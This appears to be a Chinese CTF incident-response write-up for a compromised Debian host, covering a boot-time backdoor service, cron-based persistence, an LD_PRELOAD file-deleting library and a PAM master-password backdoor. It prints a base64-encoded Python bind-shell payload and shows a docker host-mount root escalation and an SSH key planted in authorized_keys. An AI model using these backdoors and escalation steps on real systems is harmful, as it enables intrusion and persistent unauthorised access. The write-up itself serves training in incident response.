<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;python38080&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q6-7"><a class="markdownIt-Anchor" href="#q6-7"></a> Q6</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">6、找出开机启动的后门服务名称MD5，提交flag&#123;md5(服务名)&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ systemctl list-unit-files --state=enabled<br>UNIT FILE                              STATE  <br>apache2.service                        enabled<br>apparmor.service                       enabled<br>autovt@.service                        enabled<br>cloud-config.service                   enabled<br>cloud-final.service                    enabled<br>cloud-init-local.service               enabled<br>cloud-init.service                     enabled<br>console-setup.service                  enabled<br>cron.service                           enabled<br>dbus-org.freedesktop.timesync1.service enabled<br>docker-compose-app.service             enabled<br>docker.service                         enabled<br>getty@.service                         enabled<br>keyboard-setup.service                 enabled<br>networking.service                     enabled<br>rc-local.service                       enabled<br>rc.local.service                       enabled<br>rsyslog.service                        enabled<br>ssh.service                            enabled<br>sshd.service                           enabled<br>syslog.service                         enabled<br>systemd-timesyncd.service              enabled<br>remote-fs.target                       enabled<br>apt-daily-upgrade.timer                enabled<br>apt-daily.timer                        enabled<br>logrotate.timer                        enabled<br>man-db.timer                           enabled<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ systemctl <span class="hljs-built_in">cat</span> docker-compose-app.service<br><span class="hljs-comment"># /etc/systemd/system/docker-compose-app.service</span><br>[Unit]<br>Description=Docker Compose Application<br>After=network.target docker.service<br><br>[Service]<br>Type=simple<br>WorkingDirectory=/home/user/<br>ExecStart=/bin/bash /usr/lib/python3.7/site-packages/docker/startup.sh<br>ExecStop=/usr/bin/docker-compose down<br>Restart=always<br>User=user<br>TimeoutStartSec=0<br>TimeoutStopSec=0<br>KillMode=process<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">user@ip-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">10</span>-<span class="hljs-number">10</span>:~$ cat <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.7/</span>site-packages<span class="hljs-regexp">/docker/</span>startup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose -f <span class="hljs-regexp">/home/u</span>ser<span class="hljs-regexp">/nginx/</span>docker-compose.yml up -d<br><br>echo <span class="hljs-string">&#x27;import base64;v=base64.b64decode(&quot;aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwoKIyBDcmVhdGUgc29ja2V0IG9iamVjdApzID0gc29ja2V0LnNvY2tldCgpCnMuYmluZCgoJycsIDgwODApKQpzLmxpc3RlbigxKQoKIyBDb250aW51b3VzbHkgYWNjZXB0IGNvbm5lY3Rpb25zCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQogICAgdHJ5OgogICAgICAgICMgTGF1bmNoIGJhc2ggc2hlbGwgY29ubmVjdGVkIHRvIHRoaXMgc29ja2V0CiAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9iYXNoJ10sIHN0ZGluPWNvbm4sIHN0ZG91dD1jb25uLCBzdGRlcnI9Y29ubikKICAgIGZpbmFsbHk6CiAgICAgICAgIyBFbnN1cmUgdGhlIGNvbm5lY3Rpb24gaXMgY2xvc2VkIGFmdGVyIHVzZQogICAgICAgIGNvbm4uY2xvc2UoKQo=&quot;);exec(v)&#x27;</span>|nohup python3 &amp;<br></code></pre></td></tr></table></figure>
<p>解码一下是python的shell</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">docker-compose-<span class="hljs-keyword">app</span>.service<br>5213e47de16522f1dc3f9e9ecc0ab8b0<br></code></pre></td></tr></table></figure>
<h2 id="q7-6"><a class="markdownIt-Anchor" href="#q7-6"></a> Q7</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">7、渗透提权获得root目录下的flag<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -4000 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;<br></code></pre></td></tr></table></figure>
<p>没什么可以利用的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@ip-10-0-10-10:~$ docker images<br>REPOSITORY   TAG       IMAGE ID       CREATED        SIZE<br>php          fpm       4dcccbe325c2   6 months ago   499MB<br>nginx        1         39286ab8a5e1   6 months ago   188MB<br>user@ip-10-0-10-10:~$ docker run --<span class="hljs-built_in">rm</span> -v /:/host -it nginx:1 /bin/bash<br>root@8b6ea2a3e225:/# <span class="hljs-built_in">ls</span> /<br>bin   dev                  docker-entrypoint.sh  home  lib    media  opt   root  sbin  sys  usr<br>boot  docker-entrypoint.d  etc                   host  lib64  mnt    proc  run   srv   tmp  var<br>root@8b6ea2a3e225:/# <span class="hljs-built_in">cat</span> flag<br>flag&#123;ATMB_root&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q8-4"><a class="markdownIt-Anchor" href="#q8-4"></a> Q8</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">8、黑客3s埋了一个flag在权限维持过程中的地方，可以发现flag&#123;&#125;括号内的首字母是c开头，如flag&#123;cxxxxxxx&#125;<br></code></pre></td></tr></table></figure>
<p>用本地写入一共pub进去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUEJ6VzI2em43MWNUQzZvN29WUjQ1Z0Z4SG1LRjhtcHI3blRWbERlUDFGVUFsME5mTXd5UUlNeUxlVUV4dnc5enR3YjR5VFR1aTNSTC9JT3JTRGFUVEE1djEyZDE4a2d5Yk1FeUlRa0tzaHFoM1BuaUxNckN3V05Rc0FmTnBBM2t2UVNYQmdZNGhmaVkzbzdnL0g2ZktQQ3JTNDA1WlhNT0JDQXg1WjFLQWdidVZhSXJiMVZPYTVnWW5YT05zaHpJMmswNGFQUmt4WTI5QXM2RVA4WnJYN09TalNkamhZTWxKN0Y3NlZpS29IZmRSdXdBcUVrWVpEWFdIWS9KWlFJY3R4K3RkdXJPUjdqamNjck1Tb1BtQ0dXNTZxRXFtSmR5QXcwVG9XZFJUU3RlakVqNS9EbnRxRUcvYzR4ckhaK2E4RTJnR291TlVXZktZc0hKWlU0a20zZnJ0UkFianBzTjRPSUNqVC9IN3l0OUVhOThkNGg2SVkyM3U3Z2wvRXVrMVg3Smt1U0UrTFNFZHczY2t0TWhIZUhaZVpBMXN5eDRGVGFJQ1RmZ3Z3VTRvc3FZaFRKblJwMHEyK2xEbksrY3hDSyt6YWNONnF5bmthRllMdnd2VXk4bjBUR3JkQmpIL20wTktLRHl6VFJRa21UNjZxaWNETlNlVTJWTlIzZU09IG9yYW5nZUBDb3lhbm8K | <span class="hljs-built_in">base64</span> -d &gt; authorized_keys<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ ssh -i id_rsa root@43.192.32.84 -p 222<br>Linux ip-10-0-10-10 4.19.0-25-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.289-2 (2023-08-08) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Sep 24 04:58:14 2024 from 192.168.36.20<br>root@ip-10-0-10-10:~#<br></code></pre></td></tr></table></figure>
<p><strong><code>journalctl</code></strong>：</p>
<ul>
<li>用于查看系统日志（Systemd 日志）。</li>
<li>默认显示所有日志条目。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-10:~#  journalctl | grep <span class="hljs-string">&quot;cron&quot;</span> | grep flag<br>Mar 10 05:21:01 ip-10-0-10-10 CRON[1424]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:22:01 ip-10-0-10-10 CRON[1448]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:23:01 ip-10-0-10-10 CRON[1454]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:24:01 ip-10-0-10-10 CRON[1456]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:25:01 ip-10-0-10-10 CRON[1459]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:26:01 ip-10-0-10-10 CRON[1463]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:27:01 ip-10-0-10-10 CRON[1465]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:28:01 ip-10-0-10-10 CRON[1469]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:29:01 ip-10-0-10-10 CRON[1471]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:30:01 ip-10-0-10-10 CRON[1478]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:31:01 ip-10-0-10-10 CRON[1482]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:32:01 ip-10-0-10-10 CRON[1485]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:33:01 ip-10-0-10-10 CRON[1487]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:34:01 ip-10-0-10-10 CRON[1491]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:35:01 ip-10-0-10-10 CRON[1493]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:36:01 ip-10-0-10-10 CRON[1495]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:37:01 ip-10-0-10-10 CRON[1501]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:38:01 ip-10-0-10-10 CRON[1504]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:39:01 ip-10-0-10-10 CRON[1508]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:40:01 ip-10-0-10-10 CRON[1510]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:41:01 ip-10-0-10-10 CRON[1513]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:42:02 ip-10-0-10-10 CRON[1530]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:43:01 ip-10-0-10-10 CRON[1548]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:44:01 ip-10-0-10-10 CRON[1555]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:45:01 ip-10-0-10-10 CRON[1579]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:46:01 ip-10-0-10-10 CRON[1581]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:47:01 ip-10-0-10-10 CRON[1586]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:48:01 ip-10-0-10-10 CRON[1599]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:49:01 ip-10-0-10-10 CRON[1603]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:50:01 ip-10-0-10-10 CRON[1610]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:51:01 ip-10-0-10-10 CRON[1615]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:52:01 ip-10-0-10-10 CRON[1625]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:53:01 ip-10-0-10-10 CRON[1628]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:54:01 ip-10-0-10-10 CRON[1643]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:55:01 ip-10-0-10-10 CRON[1645]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:56:01 ip-10-0-10-10 CRON[1652]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:57:01 ip-10-0-10-10 CRON[1729]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:58:01 ip-10-0-10-10 CRON[1736]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 05:59:01 ip-10-0-10-10 CRON[1739]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:00:01 ip-10-0-10-10 CRON[1769]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:01:01 ip-10-0-10-10 CRON[1771]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:02:01 ip-10-0-10-10 CRON[1779]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:03:01 ip-10-0-10-10 CRON[1781]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:04:01 ip-10-0-10-10 CRON[1792]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:05:01 ip-10-0-10-10 CRON[1796]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:06:01 ip-10-0-10-10 CRON[1798]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:07:01 ip-10-0-10-10 CRON[1800]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:08:01 ip-10-0-10-10 CRON[1802]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:09:01 ip-10-0-10-10 CRON[1807]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:10:01 ip-10-0-10-10 CRON[1809]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:11:01 ip-10-0-10-10 CRON[1816]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                                                )<br>Mar 10 06:12:01 ip-10-0-10-10 CRON[1841]: (root) CMD (<span class="hljs-built_in">echo</span> flag&#123;cr0nt4b_IRfind&#125;;^Mno crontab <span class="hljs-keyword">for</span> root<br>                                                         <br></code></pre></td></tr></table></figure>
<h2 id="q9-3"><a class="markdownIt-Anchor" href="#q9-3"></a> Q9</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">9、黑客3s做了一个root用户执行cat命令就删除文件的操作，请发现删除了什么文件将文件名作为flag提交<br></code></pre></td></tr></table></figure>
<p><code>root/.bashrc</code> 是 root 用户的配置文件，只有 root 用户可以编辑或查看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-10:~# <span class="hljs-built_in">cat</span> /root/.bashrc<br><span class="hljs-comment"># ~/.bashrc: executed by bash(1) for non-login shells.</span><br><br><span class="hljs-comment"># Note: PS1 and umask are already set in /etc/profile. You should not</span><br><span class="hljs-comment"># need this unless you want different defaults for root.</span><br><span class="hljs-comment"># PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\h:\w\$ &#x27;</span><br><span class="hljs-comment"># umask 022</span><br><br><span class="hljs-comment"># You may uncomment the following lines if you want `ls&#x27; to be colorized:</span><br><span class="hljs-comment"># export LS_OPTIONS=&#x27;--color=auto&#x27;</span><br><span class="hljs-comment"># eval &quot;`dircolors`&quot;</span><br><span class="hljs-comment"># alias ls=&#x27;ls $LS_OPTIONS&#x27;</span><br><span class="hljs-comment"># alias ll=&#x27;ls $LS_OPTIONS -l&#x27;</span><br><span class="hljs-comment"># alias l=&#x27;ls $LS_OPTIONS -lA&#x27;</span><br><span class="hljs-built_in">export</span> LD_PRELOAD=/home/user/Nomal.so<br><span class="hljs-comment"># Some more alias to avoid making mistakes:</span><br><span class="hljs-comment"># alias rm=&#x27;rm -i&#x27;</span><br><span class="hljs-comment"># alias cp=&#x27;cp -i&#x27;</span><br><span class="hljs-comment"># alias mv=&#x27;mv -i&#x27;</span><br></code></pre></td></tr></table></figure>
<p>下载下来反编译看看</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10181914.png" srcset="/img/loading.gif" lazyload alt="2025-03-10181914"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;.bash_history&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q10-3"><a class="markdownIt-Anchor" href="#q10-3"></a> Q10</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">10、黑客3s很执着清理痕迹，并做了一个持续删痕迹的手段，请发现手段并给出删除的完整黑客删除命令的md5，如flag&#123;md5(rm -f /var/log/ssh.log &gt;/dev/stdout)&#125;<br></code></pre></td></tr></table></figure>
<p>直接参考q9</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">b<span class="hljs-number">0</span>f<span class="hljs-number">531</span>b<span class="hljs-number">39</span>d<span class="hljs-number">88</span>d<span class="hljs-number">4</span>f<span class="hljs-number">603</span>fc<span class="hljs-number">89</span>bd<span class="hljs-number">4</span>dd<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>aa<br></code></pre></td></tr></table></figure>
<h2 id="q11-2"><a class="markdownIt-Anchor" href="#q11-2"></a> Q11</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">11、黑客3s设置了一个万能密码后门使得这一个万能密码可以以所有用户身份登陆，也不影响原来密码使用。请发现这个万能密码，提交flag格式为flag&#123;万能密码&#125;<br></code></pre></td></tr></table></figure>
<p>攻击者可能篡改了 <code>pam_unix.so</code> 文件</p>
<p><code>pam_unix.so</code> 是 Linux 系统中用于身份验证的核心 PAM（Pluggable Authentication Modules）模块。篡改该文件可能导致攻击者绕过身份验证、获取 root 权限或窃取用户密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;pam_unix.so&quot;</span><br>/usr/lib/x86_64-linux-gnu/security/pam_unix.so<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10183408.png" srcset="/img/loading.gif" lazyload alt="2025-03-10183408"></p>
